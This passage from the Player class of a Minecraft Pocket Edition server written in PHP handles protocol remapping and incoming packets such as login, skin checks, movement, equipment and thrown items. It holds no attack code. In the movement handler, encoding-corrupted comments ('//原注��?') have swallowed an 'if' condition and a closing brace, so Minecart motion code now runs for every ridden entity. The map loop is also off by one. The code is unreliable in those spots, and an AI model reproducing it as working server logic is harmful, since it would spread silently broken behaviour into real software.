			$mappedPayload = ProtocolCompatibility::remapBatchPayloadForProtocol((int) $this->protocol, $mappedPacket->payload, (int) $this->server->networkCompressionLevel);
			if($mappedPayload !== $mappedPacket->payload){
				$mappedPacket = $modified ? $mappedPacket : clone $mappedPacket;
				$mappedPacket->payload = $mappedPayload;
				$modified = true;
			}
		}

		if(isset($mappedPacket->metadata) and is_array($mappedPacket->metadata)){
			if($mappedPacket instanceof AddEntityPacket){
				$metadata = ProtocolCompatibility::filterEntityMetadataForProtocol((int) $this->protocol, (int) $mappedPacket->type, $mappedPacket->metadata);
			}elseif(isset($mappedPacket->entityType)){
				$metadata = ProtocolCompatibility::filterEntityMetadataForProtocol((int) $this->protocol, (int) $mappedPacket->entityType, $mappedPacket->metadata);
			}else{
				$metadata = ProtocolCompatibility::filterMetadataForProtocol((int) $this->protocol, $mappedPacket->metadata);
			}
			if($metadata !== $mappedPacket->metadata){
				$mappedPacket = $modified ? $mappedPacket : clone $mappedPacket;
				$mappedPacket->metadata = $metadata;
				$modified = true;
			}
		}

		if($mappedPacket instanceof ContainerSetContentPacket and $mappedPacket->windowid === ContainerSetContentPacket::SPECIAL_CREATIVE){
			$slots = [];
			foreach($mappedPacket->slots as $item){
				$slotItem = $item instanceof Item ? $this->sanitizeProtocol013Item($item) : $item;
				if($slotItem instanceof Item and ($slotItem->getId() === Item::AIR or $slotItem->getCount() <= 0)){
					$modified = true;
					continue;
				}
				if($item instanceof Item){
					$itemMeta = $slotItem->getDamage();
					if(ProtocolCompatibility::isHiddenItemForProtocol((int) $this->protocol, $slotItem->getId(), $itemMeta === null ? 0 : (int) $itemMeta)){
						$modified = true;
						continue;
					}
				}
				if($slotItem !== $item){
					$modified = true;
				}
				$slots[] = $slotItem;
			}
			if($modified){
				$mappedPacket = $mappedPacket === $packet ? clone $mappedPacket : $mappedPacket;
				$mappedPacket->slots = $slots;
			}
		}elseif(isset($mappedPacket->slots) and is_array($mappedPacket->slots)){
			$useContainerPlaceholders = $mappedPacket instanceof ContainerSetContentPacket and $this->isProtocol013NormalContainerWindow($mappedPacket->windowid);
			$slots = [];
			foreach($mappedPacket->slots as $slot => $item){
				$slots[$slot] = $item instanceof Item ? ($useContainerPlaceholders ? $this->sanitizeProtocol013ContainerItem($item) : $this->sanitizeProtocol013Item($item)) : $item;
				if($slots[$slot] !== $item){
					$modified = true;
				}
			}
			if($modified){
				$mappedPacket = $mappedPacket === $packet ? clone $mappedPacket : $mappedPacket;
				$mappedPacket->slots = $slots;
			}
		}

		if($mappedPacket instanceof ContainerSetSlotPacket and $mappedPacket->item instanceof Item and $this->isProtocol013NormalContainerWindow($mappedPacket->windowid)){
			$item = $this->sanitizeProtocol013ContainerItem($mappedPacket->item);
			if($item !== $mappedPacket->item){
				$mappedPacket = $mappedPacket === $packet ? clone $mappedPacket : $mappedPacket;
				$mappedPacket->item = $item;
				$modified = true;
			}
		}elseif(isset($mappedPacket->item) and $mappedPacket->item instanceof Item){
			$item = $this->sanitizeProtocol013Item($mappedPacket->item);
			if($item !== $mappedPacket->item){
				$mappedPacket = $mappedPacket === $packet ? clone $mappedPacket : $mappedPacket;
				$mappedPacket->item = $item;
				$modified = true;
			}
		}

		if($mappedPacket instanceof \lycore\network\protocol\CraftingDataPacket){
			$entries = [];
			foreach($mappedPacket->entries as $entry){
				$recipeModified = false;
				$mappedEntry = $this->cloneProtocol013RecipeWithId($entry, $recipeModified);
				if($mappedEntry !== null){
					$entries[] = $mappedEntry;
					if($recipeModified){
						$modified = true;
					}
				}else{
					$modified = true;
				}
			}
			if($modified){
				$mappedPacket = $mappedPacket === $packet ? clone $mappedPacket : $mappedPacket;
				$mappedPacket->entries = $entries;
			}
		}

		return $modified ? $this->resetProtocol013RemappedPacket($mappedPacket) : $packet;
	}

	private function createCreativeInventoryPacket() : ContainerSetContentPacket{
		$pk = new ContainerSetContentPacket();
		$pk->windowid = ContainerSetContentPacket::SPECIAL_CREATIVE;

		if($this->gamemode === Player::SPECTATOR){
			$pk->slots = [];
			return $pk;
		}

		foreach($this->getCreativeInventoryItemsForProtocol((int) $this->protocol) as $item){
			$pk->slots[] = clone $item;
		}

		return $pk;
	}

	/**
	 * Handles a Minecraft packet
	 * TODO: Separate all of this in handlers
	 *
	 * WARNING: Do not use this, it's only for internal use.
	 * Changes to this function won't be recorded on the version.
	 *
	 * @param DataPacket $packet
	 */
		public function handleDataPacket(DataPacket $packet){
		if($this->connected === false){
			return;
		}

		if($packet::NETWORK_ID === ProtocolInfo::BATCH_PACKET){
			/** @var BatchPacket $packet */
			$this->server->getNetwork()->processBatch($packet, $this);
			return;
		}

		$timings = Timings::getReceiveDataPacketTimings($packet);

		$timings->startTiming();

		$this->server->getPluginManager()->callEvent($ev = new DataPacketReceiveEvent($this, $packet));
		if($ev->isCancelled()){
			$timings->stopTiming();
			return;
		}
		switch($packet::NETWORK_ID){
			case ProtocolInfo::MAP_INFO_REQUEST_PACKET:
				if($this->server->MapData->haveMap($packet->mapId)){
					$colors = $this->server->MapData->getMapData($packet->mapId);
					$pk = new ClientboundMapItemDataPacket();
					$pk->mapId = $packet->mapId;
					$pk->colors = $colors;
					$pk->isColorArray = is_array($colors);
					if(is_array($colors) or (is_string($colors) and strlen($colors) > 0)){
						$this->dataPacket($pk);
					}
				}
				break;
			case ProtocolInfo::ITEM_FRAME_DROP_ITEM_PACKET:
				$tile = $this->level->getTile($this->temporalVector->setComponents($packet->x, $packet->y, $packet->z));
				if($tile instanceof ItemFrame){
					$block = $this->level->getBlock($tile);
					$this->server->getPluginManager()->callEvent($ev = new BlockBreakEvent($this, $block, $this->getInventory()->getItemInHand(), true));
					if(!$ev->isCancelled()){
						$item = $tile->getItem();
						$this->server->getPluginManager()->callEvent($ev = new ItemFrameDropItemEvent($this, $block, $tile, $item));
						if(!$ev->isCancelled()){
							if($item->getId() !== Item::AIR){
								if((mt_rand(0, 10) / 10) < $tile->getItemDropChance()){
									$this->level->dropItem($tile, $item);
								}
								$tile->setItem(Item::get(Item::AIR));
								$tile->setItemRotation(0);
								$this->level->addSound(new ItemFrameRemoveItemSound($block), $this->level->getPlayers());
							}
						}else $tile->spawnTo($this);
					}else $tile->spawnTo($this);
			}
				break;
			case ProtocolInfo::REQUEST_CHUNK_RADIUS_PACKET:
				$this->markV84WorldReady("request_chunk_radius");
				if($this->spawned){
					$this->viewDistance = min($this->server->getViewDistance(), $packet->radius);
				}
				$pk = new ChunkRadiusUpdatePacket();
				$pk->radius = ($this->server->chunkRadius != -1) ? $this->server->chunkRadius : $packet->radius;
				$this->dataPacket($pk);
				break;
			case ProtocolInfo::PLAYER_INPUT_PACKET:
				if($this->linkedEntity instanceof Pig or ($this->linkedEntity instanceof Horse and $this->isProtocol015Player())){
					$this->linkedEntity->handleRiderInput($this, (float) $packet->motX, (float) $packet->motY, (bool) $packet->jumping, (bool) $packet->sneaking);
				}
				break;
			case ProtocolInfo::RIDER_JUMP_PACKET:
				if($this->isProtocol015Player() and $this->linkedEntity instanceof Horse){
					$this->linkedEntity->setJumpPower((float) $packet->jumpStrength);
				}
				break;
			case ProtocolInfo::LOGIN_PACKET:
				if($this->loggedIn){
					break;
				}

				$this->username = TextFormat::clean($packet->username);
				$this->displayName = $this->username;
				$this->setNameTag($this->username);
				$this->iusername = strtolower($this->username);
				$this->protocol = $packet->protocol1;
				if(count($this->server->getOnlinePlayers()) >= $this->server->getMaxPlayers() and $this->kick("disconnectionScreen.serverFull", false)){
					break;
				}

				if(!in_array($packet->protocol1, ProtocolInfo::ACCEPTED_PROTOCOLS)){
					if($packet->protocol1 < ProtocolInfo::CURRENT_PROTOCOL){
						$message = "disconnectionScreen.outdatedClient";   
						$pk = new PlayStatusPacket();
						$pk->status = PlayStatusPacket::LOGIN_FAILED_CLIENT;
						$this->directDataPacket($pk);
					}else{
						$message = "disconnectionScreen.outdatedServer";

						$pk = new PlayStatusPacket();
						$pk->status = PlayStatusPacket::LOGIN_FAILED_SERVER;
						$this->directDataPacket($pk);
					}
					$this->close("", $message, false);

					break;
				}

				if(!$this->server->isProtocolAllowed((int) $packet->protocol1)){
                    $this->close("", "服务器暂未放行该版本！", false);
					break;
				}
				$this->randomClientId = $packet->clientId;
				$this->loginData = ["clientId" => $packet->clientId, "loginData" => null];

				$this->uuid = $packet->clientUUID;
				$this->rawUUID = $this->uuid->toBinary();
				$this->clientSecret = $packet->clientSecret;

				$valid = true;
				$len = strlen($this->username);
				if($len > 16 or $len < 3){
					$valid = false;
				}
				for($i = 0; $i < $len and $valid; ++$i){
					$c = ord($this->username[$i]);
					if(($c >= ord("a") and $c <= ord("z")) or ($c >= ord("A") and $c <= ord("Z")) or ($c >= ord("0") and $c <= ord("9")) or $c === ord("_")){
						continue;
					}

					$valid = false;
					break;
				}

				if(!$valid or $this->iusername === "rcon" or $this->iusername === "console"){
					$this->close("", "disconnectionScreen.invalidName");

					break;
				}

                $skinName = $packet->skinName;

                if((strlen($packet->skin) != 64 * 64 * 4) and (strlen($packet->skin) != 64 * 32 * 4)) {
                    $skinData = $packet->skin;
                    $skinLength = strlen($skinData);

                    $STANDARD_SIZE = 64 * 32 * 4; // 8192, 标准史蒂夫
                    $HD_SIZE = 64 * 64 * 4;       // 16384, 高清皮肤

                    if ($skinLength !== $STANDARD_SIZE && $skinLength !== $HD_SIZE) {
                        // 记录警告日志
                        $this->server->getLogger()->warning(
                            "玩家 {$this->username} (协议v{$packet->protocol1}) 发送了非标准皮肤 " .
                            "(尺寸: {$skinLength} 字节) — 将自动转换为兼容格式"
                        );

                        // ===== 智能转换逻辑 =====
                        if ($packet->protocol1 == 34) {
                            $skinData = str_repeat("\x00", $STANDARD_SIZE);
                            $skinName = "Standard_Steve";
                        }elseif ($skinLength < $STANDARD_SIZE) {           // 情况1: 数据过小 (<8192) - 用透明像素填充
                            $skinData = str_pad($skinData, $STANDARD_SIZE, "\x00");
                        } // 情况2: 数据过大且不是高清尺寸 - 截断到标准尺寸
                        elseif ($skinLength > $STANDARD_SIZE && $skinLength < $HD_SIZE) {
                            $skinData = substr($skinData, 0, $STANDARD_SIZE);
                        } // 情况3: 数据超过高清尺寸 - 截断到高清尺寸
                        elseif ($skinLength > $HD_SIZE) {
                            $skinData = substr($skinData, 0, $HD_SIZE);
                        } // 其他情况（如PNG格式）- 使用默认透明皮肤
                        else {
                            // 64x32 透明皮肤（全0x00）
                            $skinData = str_repeat("\x00", $STANDARD_SIZE);
                            $skinName = "Standard_Steve";
                        }
                    } else {
                        // 验证皮肤名称有效性（防止空名称或超长导致后续问题）
                        if (!is_string($skinName) || strlen($skinName) === 0) {
                            $skinName = "Standard_Steve";
                        }
                    }
                    $this->setSkin($skinData, $skinName);
                }else{
                    $this->setSkin($packet->skin, $packet->skinName);
                }

				$this->server->getPluginManager()->callEvent($ev = new PlayerPreLoginEvent($this, "Plugin reason"));
				if($ev->isCancelled()){
					$this->close("", $ev->getKickMessage());

					break;
				}

				$this->onPlayerPreLogin();

				break;
			case ProtocolInfo::MOVE_PLAYER_PACKET:
				$this->markV84WorldReady("move_player");
				++$this->motionPacketCount;
				if($this->linkedEntity instanceof Entity){
					$entity = $this->linkedEntity;
					if($entity instanceof Pig or ($entity instanceof Horse and $this->isProtocol015Player())){
						$packet->yaw %= 360;
						$packet->pitch %= 360;
						if($packet->yaw < 0){
							$packet->yaw += 360;
						}
						$this->setRotation($packet->yaw, $packet->pitch);
						$this->newPosition = new Vector3($this->x, $this->y, $this->z);
						$this->forceMovement = null;
						break;
					}
					if($entity instanceof Minecart or $entity instanceof MinecartChest or $entity instanceof MinecartHopper){
						$packet->yaw %= 360;
						$packet->pitch %= 360;
						if($packet->yaw < 0){
							$packet->yaw += 360;
						}
						$this->setRotation($packet->yaw, $packet->pitch);
						if($entity instanceof Minecart){
							$entity->isFreeMoving = true;
							$entity->motionX = -sin($packet->yaw / 180 * M_PI);
							$entity->motionZ = cos($packet->yaw / 180 * M_PI);
						}
						$this->scheduleRidingChunkRefresh();
						$this->newPosition = new Vector3($this->x, $this->y, $this->z);
						$this->forceMovement = null;
						break;
					}
					if($entity instanceof Boat){
						$entity->handleRiderMove($this, (float) $packet->x, (float) $packet->z, (float) $packet->yaw, (float) $packet->pitch);
						$this->newPosition = new Vector3($this->x, $this->y, $this->z);
						$this->forceMovement = null;
						break;
					}
					//原注��?					if($entity instanceof Minecart){
						$entity->isFreeMoving = true;
						$entity->motionX = -sin($packet->yaw / 180 * M_PI);
						$entity->motionZ = cos($packet->yaw / 180 * M_PI);
					}
					//原注��?				}

				$newPos = new Vector3($packet->x, $packet->y - $this->getEyeHeight(), $packet->z);

				$revert = false;
				if(!$this->isAlive() or $this->spawned !== true){
					$revert = true;
					$this->forceMovement = new Vector3($this->x, $this->y, $this->z);
				}

				if($this->teleportPosition !== null or ($this->forceMovement instanceof Vector3 and (($dist = $newPos->distanceSquared($this->forceMovement)) > 1.0 or $revert))){
					if($this->forceMovement instanceof Vector3) $this->sendPosition($this->forceMovement, $packet->yaw, $packet->pitch);
				}else{
					$packet->yaw %= 360;
					$packet->pitch %= 360;

					if($packet->yaw < 0){
						$packet->yaw += 360;
					}

					$this->setRotation($packet->yaw, $packet->pitch);
					$this->newPosition = $newPos;
					$this->forceMovement = null;
				}

				break;
			case ProtocolInfo::MOB_EQUIPMENT_PACKET:
				if($this->spawned === false or !$this->isAlive()){
					break;
				}

				if($packet->slot === 0x28 or ($packet->slot === 0 and !ProtocolCompatibility::isProtocol015((int) $this->protocol)) or $packet->slot === 255){ //0 for 0.8.0 compatibility
					$packet->slot = -1; //Air
				}elseif(ProtocolCompatibility::isProtocol015((int) $this->protocol) and $packet->slot >= 0 and $packet->slot < $this->inventory->getHotbarSize()){
					// Protocol 0.15 sends hotbar true slots directly.
				}else{
					$packet->slot -= 9; //Get real block slot
				}

				/** @var Item $item */
				$item = null;
				$packetItem = $packet->item instanceof Item && $this->isCreative() ? $this->normalizeCreativeItemForThisProtocol($packet->item) : $packet->item;
				$packetItemMatches = false;

				if($this->isCreative()){ //Creative mode match
					$item = $packet->item instanceof Item ? $this->normalizeCreativeItemForThisProtocol($packet->item) : $packet->item;
					$slot = $item instanceof Item ? Item::getCreativeItemIndex($item) : -1;
					if($slot === -1 and $item instanceof Item and $item->getId() !== Item::AIR){
						//NBT items (enchanted, renamed, etc.) taken from containers are valid if present in the player's inventory
						$slot = $this->inventory->first($item);
					}
				}else{
					$item = $this->inventory->getItem($packet->slot);
					$slot = $packet->slot;
				}

				if($item instanceof Item){
					$packetItemMatches = $packetItem instanceof Item ? $item->deepEquals($packetItem) : $item->deepEquals($packet->item);
				}

				if($packet->slot === -1){ //Air
					if($this->isCreative()){
						$found = false;
						for($i = 0; $i < $this->inventory->getHotbarSize(); ++$i){
							if($this->inventory->getHotbarSlotIndex($i) === -1){
								$this->inventory->setHeldItemIndex($i);
								$this->inventory->sendHeldItem($this->getViewers());
								$this->inventory->sendContents($this);
								$found = true;
								break;
							}
						}

						if(!$found){ //couldn't find a empty slot (error)
							$this->inventory->sendContents($this);
							break;
						}
					}else{
						if($packet->selectedSlot >= 0 and $packet->selectedSlot < 9){
							$this->inventory->setHeldItemIndex($packet->selectedSlot);
							$this->inventory->setHeldItemSlot($packet->slot);
						}else{
							$this->inventory->sendContents($this);
							break;
						}
					}
				}elseif($item === null or $slot === -1 or !($packetItemMatches or ($packet->item instanceof Item and ProtocolCompatibility::requiresLegacyRedstoneMapping((int) $this->protocol) and $this->protocol013ClientHeldItemMatches($item, $packet->item)))){ // packet error or not implemented
					$this->inventory->sendContents($this);
					break;
				}elseif($this->isCreative()){
					if($packet->selectedSlot >= 0 and $packet->selectedSlot < $this->inventory->getHotbarSize()){
						$this->inventory->setHeldItemIndex($packet->selectedSlot);
						$this->inventory->setItem($packet->selectedSlot, $item);
						$this->inventory->setHeldItemSlot($packet->selectedSlot);
					}else{
						$this->inventory->sendContents($this);
						break;
					}
				}else{
					if($packet->selectedSlot >= 0 and $packet->selectedSlot < $this->inventory->getHotbarSize()){
						$this->inventory->setHeldItemIndex($packet->selectedSlot);
						$this->inventory->setHeldItemSlot($slot);
					}else{
						$this->inventory->sendContents($this);
						break;
					}
				}

				$this->inventory->sendHeldItem($this->hasSpawned);
				$this->sendProtocol011HeldEnchantmentsMessage($this->inventory->getItemInHand());

				$this->setDataFlag(self::DATA_FLAGS, self::DATA_FLAG_ACTION, false);
				break;
			case ProtocolInfo::USE_ITEM_PACKET:
				/** @var UseItemPacket $pk */
				$this->markV84WorldReady("use_item");
				$packet->decodeAdditional($this->protocol);
				if($this->spawned === false or !$this->isAlive() or $this->blocked){
					break;
				}

				$blockVector = new Vector3($packet->x, $packet->y, $packet->z);

				$this->craftingType = 0;
				$this->resetProtocol011CraftingTableState();

				if($packet->face >= 0 and $packet->face <= 5){ //Use Block, place
					$this->setDataFlag(self::DATA_FLAGS, self::DATA_FLAG_ACTION, false);

					if(!$this->canInteract($blockVector->add(0.5, 0.5, 0.5), 13) or $this->isSpectator()){

					}elseif($this->isCreative()){
						$item = $this->getCreativeUseItemForProtocol($this->inventory->getItemInHand(), $packet->item);
						if($this->level->useItemOn($blockVector, $item, $packet->face, $packet->fx, $packet->fy, $packet->fz, $this) === true){
							break;
						}
					}else{
						$heldSlot = $this->inventory->getHeldItemSlot();
						$serverHeldItem = $heldSlot >= 0 ? $this->inventory->getItem($heldSlot) : Item::get(Item::AIR, 0, 0);
						if($serverHeldItem->getId() !== Item::AIR and $serverHeldItem->getCount() <= 0){
							$this->inventory->sendContents($this);
							$this->inventory->sendHeldItem($this);
						}elseif(!$serverHeldItem->deepEquals($packet->item) and !($packet->item instanceof Item and ProtocolCompatibility::requiresLegacyRedstoneMapping((int) $this->protocol) and $this->protocol013ClientHeldItemMatches($serverHeldItem, $packet->item))){
							$this->inventory->sendHeldItem($this);
						}else{
							$item = $serverHeldItem;
							if($this->consumeProtocol011FoodInHand($item)){
								break;
							}
							$this->sendProtocol011HeldEnchantmentsMessage($item);
							$oldItem = clone $item;
							$targetBeforeUse = clone $this->level->getBlock($blockVector);
							$blockBeforeUse = clone $targetBeforeUse->getSide($packet->face);
							if($this->level->useItemOn($blockVector, $item, $packet->face, $packet->fx, $packet->fy, $packet->fz, $this)){
								if(!$item->deepEquals($oldItem) or $item->getCount() !== $oldItem->getCount()){
									if(!$this->inventory->setItem($heldSlot, $item)){
										$this->level->setBlock($targetBeforeUse, $targetBeforeUse, true, false);
										$this->level->setBlock($blockBeforeUse, $blockBeforeUse, true, false);
										$this->inventory->sendContents($this);
										$this->inventory->sendHeldItem($this);
										$this->level->sendBlocks([$this], [$targetBeforeUse, $blockBeforeUse], UpdateBlockPacket::FLAG_ALL_PRIORITY);
										break;
									}
									$this->inventory->sendHeldItem($this->hasSpawned);
									if($this->isProtocol011Player()){
										$this->inventory->sendContents($this);
										$this->inventory->sendHeldItem($this);
									}
								}
								break;
							}
						}
					}

					$this->inventory->sendHeldItem($this);

					if($blockVector->distanceSquared($this) > 10000){
						break;
					}
					$target = $this->level->getBlock($blockVector);
					$block = $target->getSide($packet->face);

					$this->level->sendBlocks([$this], [$target, $block], UpdateBlockPacket::FLAG_ALL_PRIORITY);
					break;
				}elseif($packet->face === 0xff){
					if($this->isSpectator()) break;

					$aimPos = (new Vector3($packet->x / 32768, $packet->y / 32768, $packet->z / 32768))->normalize();

					if($this->isCreative()){
						$item = $this->inventory->getItemInHand();
					}elseif(!$this->inventory->getItemInHand()->deepEquals($packet->item) and !($packet->item instanceof Item and ProtocolCompatibility::requiresLegacyRedstoneMapping((int) $this->protocol) and $this->protocol013ClientHeldItemMatches($this->inventory->getItemInHand(), $packet->item))){
						$this->inventory->sendHeldItem($this);
						break;
					}else{
						$item = $this->inventory->getItemInHand();
					}

					$itemMeta = $item->getDamage();
					if(ProtocolCompatibility::requiresLegacyRedstoneMapping((int) $this->protocol) and ProtocolCompatibility::isHiddenItemForProtocol((int) $this->protocol, $item->getId(), $itemMeta === null ? 0 : (int) $itemMeta) and !ProtocolCompatibility::hasLegacyItemSurrogateForProtocol((int) $this->protocol, $item)){
						$this->inventory->setItemInHand(Item::get(Item::AIR));
						$this->inventory->sendHeldItem($this);
						break;
					}

					$this->sendProtocol011HeldEnchantmentsMessage($item);
					$ev = new PlayerInteractEvent($this, $item, $aimPos, $packet->face, PlayerInteractEvent::RIGHT_CLICK_AIR);

					$this->server->getPluginManager()->callEvent($ev);

					if($ev->isCancelled()){
						$this->inventory->sendHeldItem($this);
						break;
					}

					if($this->tryInteractWithLookedAtVillager($item, $aimPos)){
						break;
					}

					if($this->consumeProtocol011FoodInHand($item)){
						break;
					}

					if($this->tryInteractWithLookedAtPig($item, $aimPos)){
						break;
					}

					if($this->tryInteractWithLookedAtHorse($item, $aimPos)){
						break;
					}

					if($item->getId() === Item::FISHING_ROD){
						if($this->isFishing()){
							$this->server->getPluginManager()->callEvent($ev = new PlayerUseFishingRodEvent($this, PlayerUseFishingRodEvent::ACTION_STOP_FISHING));
						}else{
							$this->server->getPluginManager()->callEvent($ev = new PlayerUseFishingRodEvent($this, PlayerUseFishingRodEvent::ACTION_START_FISHING));
						}
						if(!$ev->isCancelled()){
							if($this->isFishing()){
								if($this->fishingHook instanceof FishingHook and (($this->fishingHook->hasHookedPlayer()) or (method_exists($this->fishingHook, "canCatchFish") and $this->fishingHook->canCatchFish()))){
									$this->fishingHook->reelIn();
								}else{
									$this->unlinkHookFromPlayer();
								}
							}else{
								$nbt = new CompoundTag("", [
									"Pos" => new ListTag("Pos", [
										new DoubleTag("", $this->x),
										new DoubleTag("", $this->y + $this->getEyeHeight()),
										new DoubleTag("", $this->z)
									]),
									"Motion" => new ListTag("Motion", [
										new DoubleTag("", -sin($this->yaw / 180 * M_PI) * cos($this->pitch / 180 * M_PI)),
										new DoubleTag("", -sin($this->pitch / 180 * M_PI)),
										new DoubleTag("", cos($this->yaw / 180 * M_PI) * cos($this->pitch / 180 * M_PI))
									]),
									"Rotation" => new ListTag("Rotation", [
										new FloatTag("", $this->yaw),
										new FloatTag("", $this->pitch)
									])
								]);

								$f = 0.6;
								$this->fishingHook = new FishingHook($this->chunk, $nbt, $this);
								$this->fishingHook->setMotion($this->fishingHook->getMotion()->multiply($f));
								$this->fishingHook->spawnToAll();
							}
						}
					}elseif($item->getId() === Item::SNOWBALL){
						$nbt = new CompoundTag("", [
							"Pos" => new ListTag("Pos", [
								new DoubleTag("", $this->x),
								new DoubleTag("", $this->y + $this->getEyeHeight()),
								new DoubleTag("", $this->z)
							]),
							"Motion" => new ListTag("Motion", [
								/*new DoubleTag("", $aimPos->x),
								new DoubleTag("", $aimPos->y),
								new DoubleTag("", $aimPos->z)*/
								//TODO: remove this because of a broken client
								new DoubleTag("", -sin($this->yaw / 180 * M_PI) * cos($this->pitch / 180 * M_PI)),
								new DoubleTag("", -sin($this->pitch / 180 * M_PI)),
								new DoubleTag("", cos($this->yaw / 180 * M_PI) * cos($this->pitch / 180 * M_PI))
							]),
							"Rotation" => new ListTag("Rotation", [
								new FloatTag("", $this->yaw),
								new FloatTag("", $this->pitch)
							]),
						]);
						if($item->getDamage() === 1){
							$nbt->EnderPearlSnowball = new ByteTag("EnderPearlSnowball", 1);
						}

						$f = 1.5;
						$snowball = Entity::createEntity("Snowball", $this->chunk, $nbt, $this);
						$snowball->setMotion($snowball->getMotion()->multiply($f));
						if($this->isSurvival()){
							$item->setCount($item->getCount() - 1);
							$this->inventory->setItemInHand($item->getCount() > 0 ? $item : Item::get(Item::AIR));
						}
						if($snowball instanceof Projectile){
							$this->server->getPluginManager()->callEvent($projectileEv = new ProjectileLaunchEvent($snowball));
							if($projectileEv->isCancelled()){
								$snowball->kill();
							}else{
								$snowball->spawnToAll();
								$this->level->addSound(new LaunchSound($this), $this->getViewers());
							}
						}else{
							$snowball->spawnToAll();
						}
					}elseif($item->getId() === Item::EGG){
						$nbt = new CompoundTag("", [
							"Pos" => new ListTag("Pos", [
								new DoubleTag("", $this->x),
								new DoubleTag("", $this->y + $this->getEyeHeight()),
								new DoubleTag("", $this->z)
							]),
							"Motion" => new ListTag("Motion", [
								new DoubleTag("", -sin($this->yaw / 180 * M_PI) * cos($this->pitch / 180 * M_PI)),
								new DoubleTag("", -sin($this->pitch / 180 * M_PI)),
								new DoubleTag("", cos($this->yaw / 180 * M_PI) * cos($this->pitch / 180 * M_PI))
							]),
							"Rotation" => new ListTag("Rotation", [
								new FloatTag("", $this->yaw),
								new FloatTag("", $this->pitch)
							]),
						]);

						$f = 1.5;
						$egg = Entity::createEntity("Egg", $this->chunk, $nbt, $this);
						$egg->setMotion($egg->getMotion()->multiply($f));
						if($this->isSurvival()){
							$item->setCount($item->getCount() - 1);
							$this->inventory->setItemInHand($item->getCount() > 0 ? $item : Item::get(Item::AIR));
						}
						if($egg instanceof Projectile){
							$this->server->getPluginManager()->callEvent($projectileEv = new ProjectileLaunchEvent($egg));
							if($projectileEv->isCancelled()){
								$egg->kill();
							}else{
								$egg->spawnToAll();
								$this->level->addSound(new LaunchSound($this), $this->getViewers());
							}
						}else{
							$egg->spawnToAll();
						}
					}elseif($item->getId() == Item::ENCHANTING_BOTTLE){
						$nbt = new CompoundTag("", [
							"Pos" => new ListTag("Pos", [
								new DoubleTag("", $this->x),
								new DoubleTag("", $this->y + $this->getEyeHeight()),
								new DoubleTag("", $this->z)
							]),
							"Motion" => new ListTag("Motion", [
								new DoubleTag("", -sin($this->yaw / 180 * M_PI) * cos($this->pitch / 180 * M_PI)),
								new DoubleTag("", -sin($this->pitch / 180 * M_PI)),
								new DoubleTag("", cos($this->yaw / 180 * M_PI) * cos($this->pitch / 180 * M_PI))
							]),
							"Rotation" => new ListTag("Rotation", [
								new FloatTag("", $this->yaw),
								new FloatTag("", $this->pitch)
							]),
						]);

						$f = 1.1;
						$thrownExpBottle = new ThrownExpBottle($this->chunk, $nbt, $this);
						$thrownExpBottle->setMotion($thrownExpBottle->getMotion()->multiply($f));
						if($this->isSurvival()){
							$item->setCount($item->getCount() - 1);
							$this->inventory->setItemInHand($item->getCount() > 0 ? $item : Item::get(Item::AIR));
						}
						if($thrownExpBottle instanceof Projectile){
							$this->server->getPluginManager()->callEvent($projectileEv = new ProjectileLaunchEvent($thrownExpBottle));
							if($projectileEv->isCancelled()){
								$thrownExpBottle->kill();
							}else{
								$thrownExpBottle->spawnToAll();
								$this->level->addSound(new LaunchSound($this), $this->getViewers());
							}
						}else{
							$thrownExpBottle->spawnToAll();
						}
					}elseif($item->getId() == Item::SPLASH_POTION and $this->server->allowSplashPotion){
						$nbt = new CompoundTag("", [
							"Pos" => new ListTag("Pos", [
								new DoubleTag("", $this->x),
								new DoubleTag("", $this->y + $this->getEyeHeight()),
								new DoubleTag("", $this->z)
							]),
							"Motion" => new ListTag("Motion", [
								new DoubleTag("", -sin($this->yaw / 180 * M_PI) * cos($this->pitch / 180 * M_PI)),
								new DoubleTag("", -sin($this->pitch / 180 * M_PI)),
								new DoubleTag("", cos($this->yaw / 180 * M_PI) * cos($this->pitch / 180 * M_PI))
							]),
							"Rotation" => new ListTag("Rotation", [
								new FloatTag("", $this->yaw),
								new FloatTag("", $this->pitch)
							]),
							"PotionId" => new ShortTag("PotionId", $item->getDamage()),
						]);

						$f = 1.1;
						$thrownPotion = new ThrownPotion($this->chunk, $nbt, $this);
						$thrownPotion->setMotion($thrownPotion->getMotion()->multiply($f));
						if($this->isSurvival()){
							$item->setCount($item->getCount() - 1);
							$this->inventory->setItemInHand($item->getCount() > 0 ? $item : Item::get(Item::AIR));
						}
						if($thrownPotion instanceof Projectile){
							$this->server->getPluginManager()->callEvent($projectileEv = new ProjectileLaunchEvent($thrownPotion));
							if($projectileEv->isCancelled()){
								$thrownPotion->kill();
							}else{
								$thrownPotion->spawnToAll();
								$this->level->addSound(new LaunchSound($this), $this->getViewers());
							}
						}else{
							$thrownPotion->spawnToAll();
						}
					}elseif($item instanceof FoodSource){
						$this->lastEat = microtime(true);
					}elseif($item instanceof Map){
						$item2 = new Item(Item::FILLED_MAP);
						$mapId = round(microtime(true), 1) * 10;
						$item2->setNamedTag(new CompoundTag('', [
							new StringTag('map_uuid', (string) $mapId),
						]));
						
						$colors = [];
						for($y = 0; $y < 128; ++$y){
							for($x = 128; $x >= 0; --$x) {
								$realX = $this->getFloorX() - 64 + $x;
								$realY = $this->getFloorZ() - 64 + $y;
								$maxY = $this->getLevel()->getHighestBlockAt($realX, $realY);
								$lastY = $maxY - $this->getLevel()->getHighestBlockAt($realX + 1, $realY);;
								$block = $this->getLevel()->getBlock(new Vector3($realX, $maxY, $realY));
								$color = MapColor::getMapColorByBlock($block, $lastY);
								$colors[$y][$x] = $color;
								
							}
						}
						$this->server->MapData->saveMapData($mapId, $colors);
						$this->getInventory()->addItem($item2);
						$getitem = new Item(Item::MAP);
						$getcount = $getitem->getCount();
						for($index = 0; $index < $this->getInventory()->getSize(); $index ++){
							$setitem = $this->getInventory()->getItem($index);
							if($getitem->getID() == $setitem->getID() and $getitem->getDamage() == $setitem->getDamage()){
								if($getcount >= $setitem->getCount()){
									$getcount -= $setitem->getCount();
									$this->getInventory()->setItem($index, Item::get(Item::AIR, 0, 1));
								}else if($getcount < $setitem->getCount()){
									$this->getInventory()->setItem($index, Item::get($getitem->getID(), 0, $setitem->getCount() - $getcount));
									break;
								}
							}
						}
						
					}
					

					$this->setDataFlag(self::DATA_FLAGS, self::DATA_FLAG_ACTION, true);
					$this->startAction = $this->server->getTick();
				}
				break;
			case ProtocolInfo::PLAYER_ACTION_PACKET:
				$this->markV84WorldReady("player_action");
				//$this->eatFoodInHand();
